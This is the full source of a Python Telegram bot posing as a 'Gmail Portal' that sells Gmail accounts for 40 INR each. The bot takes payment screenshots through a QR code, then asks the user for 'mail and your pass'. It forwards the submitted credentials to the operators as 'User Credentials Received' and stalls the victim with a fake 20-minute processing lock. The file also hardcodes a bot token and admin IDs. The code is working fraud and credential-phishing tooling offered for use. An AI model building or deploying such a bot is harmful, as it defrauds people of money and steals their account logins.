import os
import time
import json
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
import telebot
from telebot import types

# ----------------- CONFIGURATION -----------------
BOT_TOKEN = "7823545024:AAG7tyrhxhtwMTu2xKe47uzhK4SQHRkdmrc"
SUPER_ADMINS = [6289653515, 7393427319]

PUBLIC_CHANNELS = ["@jyoex", "@comchater", "@foraremy"]
BACKUP_CHANNEL_LINK = "https://t.me/+YwwAed_oQwU5YWY1"
ANNOUNCEMENT_CHANNEL_LINK = "https://t.me/+ObinPrPz_ktkODJl"
WORK_BOT_LINK = "https://t.me/talkwithhimbot"

PER_REFERRAL_REWARD = 2
DB_FILE = "bot_data.json"
# --------------------------------------------------

bot = telebot.TeleBot(BOT_TOKEN, parse_mode=None)

class HealthCheckHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"Bot is online 24/7")

    def log_message(self, format, *args):
        return

def run_server():
    port = int(os.environ.get("PORT", 8080))
    server = HTTPServer(('0.0.0.0', port), HealthCheckHandler)
    server.serve_forever()

threading.Thread(target=run_server, daemon=True).start()

def load_data():
    default_db = {
        "users": {},
        "admins": SUPER_ADMINS,
        "banned": [],
        "qr_file_id": None,
        "settings": {
            "maintenance": False,
            "new_user_notify": True
        }
    }
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, 'r', encoding='utf-8') as f:
                d = json.load(f)
                for k, v in default_db.items():
                    if k not in d:
                        d[k] = v
                return d
        except Exception:
            pass
    return default_db

def save_data(data):
    try:
        with open(DB_FILE, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=4, ensure_ascii=False)
    except Exception as e:
        print(f"Error saving data: {e}")

data = load_data()
user_states = {}
processing_timers = {}

MENU_BUTTONS = [
    "Join Announcement Channel",
    "24x7 consumer helpline",
    "Work with us",
    "Mail create",
    "💰 My Balance",
    "👥 Referrals",
    "⚙️ Help",
    "🛠️ Admin Panel",
    "🚫 Cancel",
    "❌ Cancel"
]

def is_admin(user_id):
    return user_id in data.get("admins", SUPER_ADMINS) or user_id in SUPER_ADMINS

def get_user(user_id):
    str_id = str(user_id)
    if str_id not in data["users"]:
        data["users"][str_id] = {
            "balance": 0,
            "referred_by": None,
            "referral_rewarded": False,
            "total_referrals": 0,
            "joined_at": time.strftime("%Y-%m-%d %H:%M:%S")
        }
        save_data(data)
        
        # New User Alert
        if data.get("settings", {}).get("new_user_notify", True):
            for adm in data.get("admins", SUPER_ADMINS):
                try:
                    bot.send_message(adm, f"👤 **New User Alert:**\n🆔 User ID: `{user_id}`\n📅 Date: {time.strftime('%d-%m-%Y %H:%M')}", parse_mode="Markdown")
                except Exception:
                    pass
    return data["users"][str_id]

def is_subscribed(user_id):
    for ch in PUBLIC_CHANNELS:
        try:
            member = bot.get_chat_member(ch, user_id)
            if member.status in ['left', 'kicked']:
                return False
        except Exception:
            return False
    return True

def get_force_join_keyboard():
    markup = types.InlineKeyboardMarkup()
    btn1 = types.InlineKeyboardButton("📢 Jyoex", url="https://t.me/jyoex")
    btn2 = types.InlineKeyboardButton("📢 Comchater", url="https://t.me/comchater")
    btn3 = types.InlineKeyboardButton("📢 Foraremy", url="https://t.me/foraremy")
    btn4 = types.InlineKeyboardButton("🛡️ Backup", url=BACKUP_CHANNEL_LINK)
    verify_btn = types.InlineKeyboardButton("✅ Verify", callback_data="check_joined")
    
    markup.row(btn1, btn2)
    markup.row(btn3, btn4)
    markup.row(verify_btn)
    return markup

def get_bottom_menu_keyboard(user_id):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn_announcement = types.KeyboardButton("Join Announcement Channel")
    btn_helpline = types.KeyboardButton("24x7 consumer helpline")
    btn_work = types.KeyboardButton("Work with us")
    btn_mail = types.KeyboardButton("Mail create")
    btn_balance = types.KeyboardButton("💰 My Balance")
    btn_referrals = types.KeyboardButton("👥 Referrals")
    btn_help = types.KeyboardButton("⚙️ Help")
    
    markup.row(btn_announcement)
    markup.row(btn_helpline)
    markup.row(btn_work, btn_mail)
    markup.row(btn_balance, btn_referrals)
    
    if is_admin(user_id):
        btn_admin = types.KeyboardButton("🛠️ Admin Panel")
        markup.row(btn_help, btn_admin)
    else:
        markup.row(btn_help)
    return markup

# Admin Dashboard Inline Keyboard
def get_admin_panel_inline():
    markup = types.InlineKeyboardMarkup(row_width=2)
    m_state = "🔴 ON" if data["settings"].get("maintenance") else "⚪ OFF"
    n_state = "🔔 ON" if data["settings"].get("new_user_notify") else "🔕 OFF"
    
    btn1 = types.InlineKeyboardButton("📨 Mailing / Broadcast", callback_data="adm_cmd_mail")
    btn2 = types.InlineKeyboardButton("📊 Statistics", callback_data="adm_cmd_stats")
    btn3 = types.InlineKeyboardButton(f"🛠️ Maintenance ({m_state})", callback_data="adm_cmd_toggle_maint")
    btn4 = types.InlineKeyboardButton(f"👤 New User Notify ({n_state})", callback_data="adm_cmd_toggle_notify")
    btn5 = types.InlineKeyboardButton("👥 Manage Admins", callback_data="adm_cmd_manage_admins")
    btn6 = types.InlineKeyboardButton("🖼️ Update QR Code", callback_data="adm_cmd_update_qr")
    
    markup.add(btn1, btn2)
    markup.add(btn3, btn4)
    markup.add(btn5, btn6)
    return markup

def get_admin_action_keyboard(target_id):
    markup = types.InlineKeyboardMarkup()
    is_ban = target_id in data.get("banned", [])
    ban_text = "🟢 Unban" if is_ban else "⛔ Ban"
    
    btn_ban = types.InlineKeyboardButton(ban_text, callback_data=f"adm_ban_{target_id}")
    btn_notify = types.InlineKeyboardButton("❗ Notify", callback_data=f"adm_not_{target_id}")
    btn_ask = types.InlineKeyboardButton("❓ Ask / Reply", callback_data=f"adm_rep_{target_id}")
    
    markup.row(btn_ban, btn_notify, btn_ask)
    return markup

def get_payment_admin_keyboard(target_id):
    markup = types.InlineKeyboardMarkup()
    is_ban = target_id in data.get("banned", [])
    ban_text = "🟢 Unban" if is_ban else "⛔ Ban"

    btn_app = types.InlineKeyboardButton("✅ Approve", callback_data=f"adm_app_{target_id}")
    btn_rej = types.InlineKeyboardButton("❌ Reject", callback_data=f"adm_rej_{target_id}")
    btn_ban = types.InlineKeyboardButton(ban_text, callback_data=f"adm_ban_{target_id}")
    btn_notify = types.InlineKeyboardButton("❗ Notify", callback_data=f"adm_not_{target_id}")
    btn_ask = types.InlineKeyboardButton("❓ Ask / Reply", callback_data=f"adm_rep_{target_id}")

    markup.row(btn_app, btn_rej)
    markup.row(btn_ban, btn_notify, btn_ask)
    return markup

def send_delayed_give_hit(target_id):
    time.sleep(5)
    user_states[target_id] = "AWAITING_CREDENTIALS"
    try:
        bot.send_message(target_id, "𝗚𝗜𝗩𝗘 𝗛𝗜𝗧 𝗢𝗥 𝗠𝗔𝗜𝗟 𝗔𝗡𝗗 𝙔𝙊𝙐𝙍 𝗣𝗔𝗦𝗦")
    except Exception:
        pass

WELCOME_TEXT = (
    "🚀 **WELCOME TO GMAIL PORTAL** 🚀\n"
    "━━━━━━━━━━━━━━━━━━━━━━\n"
    "⚡ **Looking for Premium & Fresh Gmail Accounts?**\n"
    "We provide 100% genuine accounts created on real devices with trusted warranty.\n\n"
    "💎 **Why Choose Us?**\n"
    "• 100% Real Device Creation\n"
    "• Zero Panel / No Cheap Bots\n"
    "• Bulk Orders Accepted\n"
    "• Fast Delivery & 24/7 Support\n"
    "━━━━━━━━━━━━━━━━━━━━━━\n"
    "⚠️ **Note:** You must join all channels below to access this bot."
)

@bot.message_handler(commands=['start', 'admin'])
def start_handler(message):
    user_id = message.from_user.id
    if user_id in data.get("banned", []):
        bot.send_message(user_id, "⛔ You are banned from using this bot.")
        return

    # Maintenance Check
    if data.get("settings", {}).get("maintenance", False) and not is_admin(user_id):
        bot.send_message(user_id, "🛠️ **Bot is under maintenance for upgrades!**\nPlease wait, we will be back online soon.")
        return

    user = get_user(user_id)
    user_states.pop(user_id, None)

    if message.text.startswith('/admin'):
        if is_admin(user_id):
            bot.send_message(user_id, "🔧 **You are in the Administrator Dashboard:**", reply_markup=get_admin_panel_inline(), parse_mode="Markdown")
        else:
            bot.send_message(user_id, "❌ Access Denied.")
        return

    args = message.text.split()
    if len(args) > 1 and user["referred_by"] is None:
        ref_id = args[1]
        if ref_id != str(user_id) and ref_id in data["users"]:
            user["referred_by"] = ref_id
            save_data(data)

    if not is_subscribed(user_id):
        bot.send_message(
            user_id,
            WELCOME_TEXT,
            reply_markup=get_force_join_keyboard(),
            parse_mode="Markdown"
        )
        return

    bot.send_message(
        user_id,
        "✅ **Welcome back! Please choose an option from the menu below:**",
        reply_markup=get_bottom_menu_keyboard(user_id),
        parse_mode="Markdown"
    )

@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    user_id = call.from_user.id
    user = get_user(user_id)

    if call.data == "check_joined":
        if is_subscribed(user_id):
            if user.get("referred_by") and not user.get("referral_rewarded"):
                ref_user = get_user(user["referred_by"])
                ref_user["balance"] += PER_REFERRAL_REWARD
                ref_user["total_referrals"] += 1
                user["referral_rewarded"] = True
                save_data(data)
                try:
                    bot.send_message(int(user["referred_by"]), f"🎉 New user joined via your link! +{PER_REFERRAL_REWARD} Credits added.")
                except Exception:
                    pass

            try:
                bot.delete_message(call.message.chat.id, call.message.message_id)
            except Exception:
                pass
            
            bot.send_message(
                user_id,
                "🎉 **Verification Successful!**\n\nWelcome to **Gmail Portal**. Choose an option below:",
                reply_markup=get_bottom_menu_keyboard(user_id),
                parse_mode="Markdown"
            )
        else:
            bot.answer_callback_query(call.id, "❌ Please join all channels first!", show_alert=True)
        return

    if call.data == "user_reply_to_admin":
        user_states[user_id] = "AWAITING_SUPPORT_MESSAGE"
        cancel_kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
        cancel_kb.add(types.KeyboardButton("🚫 Cancel"))
        bot.send_message(user_id, "✍️ Type your reply for the admin:", reply_markup=cancel_kb)
        return

    # Admin Control Handlers
    if is_admin(user_id):
        # Admin Panel Commands
        if call.data == "adm_cmd_stats":
            total_users = len(data.get("users", {}))
            total_admins = len(data.get("admins", SUPER_ADMINS))
            stats_text = (
                f"📊 **BOT STATISTICS**\n━━━━━━━━━━━━━━━━━━━━\n"
                f"👥 Total Users: `{total_users}`\n"
                f"👑 Total Admins: `{total_admins}`\n"
                f"🚫 Banned Users: `{len(data.get('banned', []))}`\n"
                f"⚙️ Maintenance: `{'ON' if data['settings'].get('maintenance') else 'OFF'}`\n"
                f"🔔 New User Notify: `{'ON' if data['settings'].get('new_user_notify') else 'OFF'}`\n"
            )
            bot.send_message(user_id, stats_text, parse_mode="Markdown")
            bot.answer_callback_query(call.id)

        elif call.data == "adm_cmd_toggle_maint":
            data["settings"]["maintenance"] = not data["settings"].get("maintenance", False)
            save_data(data)
            bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=get_admin_panel_inline())
            bot.answer_callback_query(call.id, f"Maintenance is now {'ON' if data['settings']['maintenance'] else 'OFF'}")

        elif call.data == "adm_cmd_toggle_notify":
            data["settings"]["new_user_notify"] = not data["settings"].get("new_user_notify", True)
            save_data(data)
            bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=get_admin_panel_inline())
            bot.answer_callback_query(call.id, f"Notify is now {'ON' if data['settings']['new_user_notify'] else 'OFF'}")

        elif call.data == "adm_cmd_mail":
            user_states[user_id] = "ADMIN_BROADCAST"
            cancel_kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
            cancel_kb.add(types.KeyboardButton("🚫 Cancel"))
            bot.send_message(user_id, "📨 **Send the Broadcast Message or Photo** you want to send to ALL users:", reply_markup=cancel_kb)
            bot.answer_callback_query(call.id)

        elif call.data == "adm_cmd_manage_admins":
            user_states[user_id] = "ADMIN_ADD_ADMIN"
            cancel_kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
            cancel_kb.add(types.KeyboardButton("🚫 Cancel"))
            current_admins = ", ".join([f"`{a}`" for a in data.get("admins", SUPER_ADMINS)])
            bot.send_message(user_id, f"👥 **Current Admins:**\n{current_admins}\n\n👉 Send the **UserID** of the person you want to ADD as Admin:", reply_markup=cancel_kb, parse_mode="Markdown")
            bot.answer_callback_query(call.id)

        elif call.data == "adm_cmd_update_qr":
            user_states[user_id] = "ADMIN_SET_QR"
            cancel_kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
            cancel_kb.add(types.KeyboardButton("🚫 Cancel"))
            bot.send_message(user_id, "🖼️ Please send the **new QR Code Photo** right now:", reply_markup=cancel_kb)
            bot.answer_callback_query(call.id)

        elif call.data.startswith("adm_app_"):
            target_id = int(call.data.split("adm_app_")[1])
            try:
                bot.send_message(target_id, "Your funds have safely reached me.")
                threading.Thread(target=send_delayed_give_hit, args=(target_id,), daemon=True).start()
                bot.answer_callback_query(call.id, "Payment Approved ✅")
                if call.message.caption:
                    bot.edit_message_caption(caption=call.message.caption + "\n\n🟢 **APPROVED BY ADMIN**", chat_id=call.message.chat.id, message_id=call.message.message_id)
                else:
                    bot.edit_message_text(text=call.message.text + "\n\n🟢 **APPROVED BY ADMIN**", chat_id=call.message.chat.id, message_id=call.message.message_id)
            except Exception:
                pass

        elif call.data.startswith("adm_rej_"):
            target_id = int(call.data.split("adm_rej_")[1])
            user_states.pop(target_id, None)
            try:
                bot.send_message(target_id, "Your funds are not reached us your transaction id invalid", reply_markup=get_bottom_menu_keyboard(target_id))
                bot.answer_callback_query(call.id, "Payment Rejected ❌")
                if call.message.caption:
                    bot.edit_message_caption(caption=call.message.caption + "\n\n🔴 **REJECTED BY ADMIN**", chat_id=call.message.chat.id, message_id=call.message.message_id)
                else:
                    bot.edit_message_text(text=call.message.text + "\n\n🔴 **REJECTED BY ADMIN**", chat_id=call.message.chat.id, message_id=call.message.message_id)
            except Exception:
                pass

        elif call.data.startswith("adm_ban_"):
            target_id = int(call.data.split("adm_ban_")[1])
            if target_id in data.get("banned", []):
                data["banned"].remove(target_id)
                bot.answer_callback_query(call.id, "User Unbanned ✅")
            else:
                data["banned"].append(target_id)
                bot.answer_callback_query(call.id, "User Banned ⛔")
            save_data(data)

        elif call.data.startswith("adm_rep_"):
            target_id = int(call.data.split("adm_rep_")[1])
            user_states[user_id] = {"mode": "ADMIN_REPLYING", "target": target_id}
            bot.send_message(user_id, f"✍️ Type the **Reply / Details** for User `{target_id}` (User will get Reply button):")

        elif call.data.startswith("adm_not_"):
            target_id = int(call.data.split("adm_not_")[1])
            user_states[user_id] = {"mode": "ADMIN_NOTIFYING", "target": target_id}
            bot.send_message(user_id, f"📢 Type the **Notification Alert** for User `{target_id}` (No Reply button):")

@bot.message_handler(func=lambda msg: True, content_types=['text', 'photo'])
def handle_all_messages(message):
    user_id = message.from_user.id
    text = message.text or ""

    # Maintenance Check
    if data.get("settings", {}).get("maintenance", False) and not is_admin(user_id):
        bot.send_message(user_id, "🛠️ **Bot is under maintenance for upgrades!**\nPlease wait, we will be back online soon.")
        return

    if user_id in data.get("banned", []):
        bot.send_message(user_id, "⛔ You are banned from using this bot.")
        return

    # Admin Dashboard Actions & Broadcast Handling
    if is_admin(user_id) and user_id in user_states:
        state_data = user_states[user_id]

        if state_data == "ADMIN_SET_QR":
            if message.content_type == 'photo':
                data["qr_file_id"] = message.photo[-1].file_id
                save_data(data)
                user_states.pop(user_id, None)
                bot.send_message(user_id, "✅ **New QR Code updated successfully!**", reply_markup=get_bottom_menu_keyboard(user_id))
            else:
                bot.send_message(user_id, "⚠️ Please send a valid photo.")
            return

        if state_data == "ADMIN_ADD_ADMIN":
            user_states.pop(user_id, None)
            if text.isdigit():
                new_adm = int(text)
                if new_adm not in data["admins"]:
                    data["admins"].append(new_adm)
                    save_data(data)
                    bot.send_message(user_id, f"✅ User `{new_adm}` added to Admins list!", reply_markup=get_bottom_menu_keyboard(user_id), parse_mode="Markdown")
                else:
                    bot.send_message(user_id, "⚠️ User is already an admin.", reply_markup=get_bottom_menu_keyboard(user_id))
            else:
                bot.send_message(user_id, "❌ Invalid User ID. Must be numeric.", reply_markup=get_bottom_menu_keyboard(user_id))
            return

        if state_data == "ADMIN_BROADCAST":
            user_states.pop(user_id, None)
            all_users = list(data.get("users", {}).keys())
            bot.send_message(user_id, f"⏳ Broadcasting message to {len(all_users)} users...")
            sent, failed = 0, 0
            for uid in all_users:
                try:
                    if message.content_type == 'photo':
                        bot.send_photo(int(uid), message.photo[-1].file_id, caption=message.caption or "")
                    else:
                        bot.send_message(int(uid), text)
                    sent += 1
                except Exception:
                    failed += 1
            bot.send_message(user_id, f"✅ **Broadcast Completed!**\n✔ Sent: {sent}\n❌ Failed: {failed}", reply_markup=get_bottom_menu_keyboard(user_id))
            return

        if isinstance(state_data, dict):
            target = state_data["target"]
            mode = state_data["mode"]
            user_states.pop(user_id, None)

            if mode == "ADMIN_REPLYING":
                try:
                    markup = types.InlineKeyboardMarkup()
                    markup.add(types.InlineKeyboardButton("Reply to Admin", callback_data="user_reply_to_admin"))
                    msg_body = f"💬 **Admin message #msg**\n─────────────────\n{text}"
                    bot.send_message(target, msg_body, reply_markup=markup, parse_mode="Markdown")
                    bot.send_message(user_id, f"✔ Message successfully sent to user (`{target}`) with Reply option!")
                except Exception as e:
                    bot.send_message(user_id, f"❌ Failed to send: {e}")
                return

            elif mode == "ADMIN_NOTIFYING":
                try:
                    bot.send_message(target, f"🔔 **Notification Alert:**\n\n{text}", parse_mode="Markdown")
                    bot.send_message(user_id, f"✔ Alert successfully sent to user (`{target}`) without Reply button!")
                except Exception as e:
                    bot.send_message(user_id, f"❌ Failed to send: {e}")
                return

    # 20 Minutes Lock Handler
    if user_id in processing_timers and not is_admin(user_id):
        if time.time() - processing_timers[user_id] < 1200:
            if text not in MENU_BUTTONS:
                bot.send_message(user_id, "W8 a minute 𝙂𝙢𝙖𝙞𝙡 𝙞𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜 𝙥𝙡𝙨 𝙬𝙖𝙞𝙩✋🥺")
                return
        else:
            processing_timers.pop(user_id, None)

    if not is_subscribed(user_id):
        bot.send_message(
            user_id,
            "⚠️ **Access Denied!** Please join all channels to use the bot.",
            reply_markup=get_force_join_keyboard()
        )
        return

    state = user_states.get(user_id)

    if text in ["🚫 Cancel", "❌ Cancel"]:
        user_states.pop(user_id, None)
        bot.send_message(user_id, "❌ Action Cancelled.", reply_markup=get_bottom_menu_keyboard(user_id))
        return

    # User sends Payment SS/Text
    if state == "AWAITING_PAYMENT_SS":
        user_states.pop(user_id, None)
        user_info = get_user(user_id)

        admin_caption = (
            f"💳 **New Payment Order Submission:**\n"
            f"👤 User: {message.from_user.first_name}\n"
            f"🆔 User ID: `{user_id}`\n"
            f"👤 Username: @{message.from_user.username or 'None'}\n"
            f"👥 Referrals: `{user_info.get('total_referrals', 0)}`\n"
            f"💵 Balance: `{user_info.get('balance', 0)}`"
        )

        for admin in data.get("admins", SUPER_ADMINS):
            try:
                if message.content_type == 'photo':
                    bot.send_photo(admin, message.photo[-1].file_id, caption=admin_caption, reply_markup=get_payment_admin_keyboard(user_id), parse_mode="Markdown")
                else:
                    bot.send_message(admin, f"{admin_caption}\n\n📝 Details:\n{text}", reply_markup=get_payment_admin_keyboard(user_id), parse_mode="Markdown")
            except Exception:
                pass

        bot.send_message(
            user_id,
            "Wait a moment, mode are verifying your payment , let the approval come from there.",
            reply_markup=get_bottom_menu_keyboard(user_id)
        )
        return

    # User responds to GIVE HIT OR MAIL AND YOUR PASS
    if state == "AWAITING_CREDENTIALS":
        user_states.pop(user_id, None)
        processing_timers[user_id] = time.time()

        for admin in data.get("admins", SUPER_ADMINS):
            try:
                bot.send_message(
                    admin,
                    f"🔐 **User Credentials Received:**\nUser: {message.from_user.first_name} (`{user_id}`)\n\n{text}",
                    reply_markup=get_admin_action_keyboard(user_id)
                )
            except Exception:
                pass

        bot.send_message(user_id, "𝙂𝙢𝙖𝙞𝙡 𝙞𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜 𝙥𝙡𝙨 𝙬𝙖𝙞𝙩✋🥺", reply_markup=get_bottom_menu_keyboard(user_id))
        return

    # Helpline Support State
    if state == "AWAITING_SUPPORT_MESSAGE":
        msg_length = len(text)
        word_count = len(text.split())
        
        if msg_length < 15:
            bot.send_message(user_id, f"⚠️ Message too short! Minimum 15 letters required (currently {msg_length} letters).")
            return
        if word_count > 150:
            bot.send_message(user_id, f"⚠️ Message too long! Maximum 150 words allowed (currently {word_count} words).")
            return

        user_states.pop(user_id, None)
        user_info = get_user(user_id)
        
        report_card = (
            f"**24x7 Consumer Support** 📩\n"
            f"User: {message.from_user.first_name}\n"
            f"UserCode / ID: `{user_id}`\n"
            f"Username: @{message.from_user.username or 'None'}\n"
            f"Referrals: `{user_info.get('total_referrals', 0)}`\n"
            f"Balance: `{user_info.get('balance', 0)}`\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"📩 **Message:**\n{text}"
        )

        for admin in data.get("admins", SUPER_ADMINS):
            try:
                bot.send_message(admin, report_card, reply_markup=get_admin_action_keyboard(user_id), parse_mode="Markdown")
            except Exception:
                pass

        bot.send_message(
            user_id,
            "Your report successfully accepted soon our moderator replied you",
            reply_markup=get_bottom_menu_keyboard(user_id)
        )
        return

    # Menu Buttons
    if text == "🛠️ Admin Panel" and is_admin(user_id):
        bot.send_message(user_id, "🔧 **You are in the Administrator Dashboard:**", reply_markup=get_admin_panel_inline(), parse_mode="Markdown")

    elif text == "Join Announcement Channel":
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📢 Open Announcement Channel", url=ANNOUNCEMENT_CHANNEL_LINK))
        bot.send_message(user_id, "👇 Tap below to join our official Announcement Channel:", reply_markup=markup)

    elif text == "24x7 consumer helpline":
        user_states[user_id] = "AWAITING_SUPPORT_MESSAGE"
        cancel_kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
        cancel_kb.add(types.KeyboardButton("🚫 Cancel"))
        helpline_prompt = (
            '"If you have any issues, questions, or suggestions regarding Gmail Creator Bot, '
            'please let us know through a text message. Our support team will do its best to assist you."'
        )
        bot.send_message(user_id, helpline_prompt, reply_markup=cancel_kb)

    elif text == "Work with us":
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("💬 @talkwithhimbot", url=WORK_BOT_LINK))
        work_text = "DM us on  We’ll explain the work in detail, and you can earn good money with us. @talkwithhimbot"
        bot.send_message(user_id, work_text, reply_markup=markup)

    elif text == "Mail create":
        user_states[user_id] = "AWAITING_PAYMENT_SS"
        cancel_kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
        cancel_kb.add(types.KeyboardButton("🚫 Cancel"))
        
        caption_text = "per mail 40 inr after payment your mail will be created"
        second_text = "[📋]\n𝗦𝗘𝗡𝗗  𝗣𝗔𝗬𝗠𝗘𝗡𝗧 𝗦𝗦 𝗔𝗡𝗗 𝗪𝗜𝗧𝗛 𝗖𝗟𝗘𝗔𝗥 𝗦𝗛𝗢𝗪𝗜𝗡𝗚 𝗧𝗥𝗔𝗡𝗦𝗔𝗖𝗧𝗜𝗢𝗡 𝗜𝗗 𝗔𝗡𝗗 𝗡𝗔𝗠𝗘 😇"
        
        qr_to_send = data.get("qr_file_id")
        if qr_to_send:
            try:
                bot.send_photo(user_id, qr_to_send, caption=caption_text)
                bot.send_message(user_id, second_text, reply_markup=cancel_kb)
                return
            except Exception:
                pass
        
        bot.send_message(user_id, f"{caption_text}\n\n{second_text}", reply_markup=cancel_kb)

    elif text == "💰 My Balance":
        user_info = get_user(user_id)
        bot.send_message(
            user_id,
            f"💰 **Your Account Balance:**\n\n"
            f"🆔 User ID: `{user_id}`\n"
            f"💵 Current Balance: `{user_info.get('balance', 0)} Credits`\n"
            f"👥 Total Referrals: `{user_info.get('total_referrals', 0)}`",
            parse_mode="Markdown"
        )

    elif text == "👥 Referrals":
        user_info = get_user(user_id)
        try:
            bot_username = bot.get_me().username
            ref_link = f"https://t.me/{bot_username}?start={user_id}"
            bot.send_message(
                user_id,
                f"👥 **Refer & Earn Program:**\n\n"
                f"Share your referral link with friends and earn **+{PER_REFERRAL_REWARD} Credits** for every joined user!\n\n"
                f"🔗 **Your Link:**\n`{ref_link}`\n\n"
                f"📊 Total Referrals: `{user_info.get('total_referrals', 0)}`",
                parse_mode="Markdown"
            )
        except Exception:
            bot.send_message(user_id, "⚠️ Error generating referral link. Please try again later.")

    elif text == "⚙️ Help":
        help_text = (
            "⚙️ **Help & Information:**\n\n"
            "• **Mail create:** Request fresh and premium Gmail accounts.\n"
            "• **Referrals:** Invite friends to earn free credits.\n"
            "• **24x7 consumer helpline:** Send direct report to support team.\n\n"
            "Official Updates: @comchater"
        )
        bot.send_message(user_id, help_text, parse_mode="Markdown")

if __name__ == "__main__":
    while True:
        try:
            bot.infinity_polling(timeout=20, long_polling_timeout=10)
        except Exception as e:
            time.sleep(3)
